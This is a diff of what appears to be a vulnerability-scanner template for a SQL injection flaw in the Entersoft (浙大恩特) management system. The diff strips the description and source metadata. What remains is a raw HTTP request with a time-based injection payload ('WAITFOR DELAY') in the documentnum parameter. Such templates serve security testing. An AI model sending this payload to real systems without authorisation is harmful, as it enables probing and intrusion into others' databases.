@@ -3,12 +3,8 @@ info:
   name: 浙大恩特管理系统 T0140_editAction.entweb SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xw9prkk6zpqz86ei'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xw9prkk6zpqz86ei
-    fofa: 暂无
 http:
 - raw:
   - 'GET /entsoft/T0140_editAction.entweb;.js?method=getdocumentnumFlag&documentnum=1'';WAITFOR+DELAY+''0:0:5''-- HTTP/1.1
